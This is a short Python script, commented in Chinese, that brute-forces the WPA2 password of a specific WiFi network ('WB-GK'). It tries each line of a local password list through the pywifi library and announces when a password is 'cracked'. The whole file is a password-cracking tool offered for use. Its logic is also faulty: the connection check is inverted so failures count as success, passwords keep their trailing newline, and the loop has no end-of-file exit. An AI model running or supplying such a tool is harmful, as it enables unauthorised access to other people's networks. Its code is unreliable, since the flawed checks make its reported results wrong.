import time

import pywifi
from pywifi import const


#测试连接，返回连接结果
def wifiConnect(pwd):
    #抓取网卡接口
    wifi=pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces=wifi.interfaces()[0]
    print(ifaces)
    print(ifaces.name())
    #断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus=ifaces.status()
    if wifistatus==const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile=pywifi.Profile()
        #要连接的wifi名称
        profile.ssid='WB-GK'
        #网卡的开放状态
        profile.auth=const.AUTH_ALG_OPEN
        #WiFi加密算法，一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #调用密码
        profile.key=pwd
        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        #wifi连接时间
        time.sleep(3)
        if ifaces.status()==const.IFACE_DISCONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

#读取密码本
def readPassword():
    print("开始破解：")
    #密码本路径
    path="../00_项目文件库/2_File/password.txt"
    #打开文件
    file=open(path,"r")
    while True:
        try:
            #一行一行读取
            pad=file.readline()
            bool=wifiConnect(pad)
            if bool:
                print("密码已经破解:",pad)
                print("wifi已经自动连接！！")
                break
            else:
                #跳出当前循环，进行下一次循环
                print("密码破解中...密码校对：",pad)
        except:
            continue

if __name__ == '__main__':
    readPassword()